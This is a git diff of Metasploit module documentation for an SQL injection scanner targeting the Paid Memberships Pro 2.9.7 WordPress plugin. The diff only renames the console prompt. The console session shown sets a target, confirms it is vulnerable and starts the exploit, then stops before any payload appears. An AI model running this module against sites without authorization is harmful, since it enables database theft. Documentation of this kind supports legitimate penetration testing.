@@ -32,18 +32,18 @@ The larger this list, the more time it will take.  Defaults to `1`.
 ### Paid Membership Pro 2.9.7 on Wordpress 5.7.5 on Ubuntu 20.04
 
 ```
-msf6 > use auxiliary/scanner/http/wp_paid_membership_pro_code_sqli
+msf > use auxiliary/scanner/http/wp_paid_membership_pro_code_sqli
 [*] Using auxiliary/scanner/http/wp_paid_membership_pro_code_sqli
-msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > set rhosts 1.1.1.1
+msf auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > set verbose true
+msf auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > check
+msf auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > check
 
 [*] Checking /wp-content/plugins/paid-memberships-pro/readme.txt
 [*] Found version 2.9.7 in the plugin
 [*] 1.1.1.1:80 - The target appears to be vulnerable.
-msf6 auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > exploit
+msf auxiliary(scanner/http/wp_paid_membership_pro_code_sqli) > exploit
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [*] Checking /wp-content/plugins/paid-memberships-pro/readme.txt
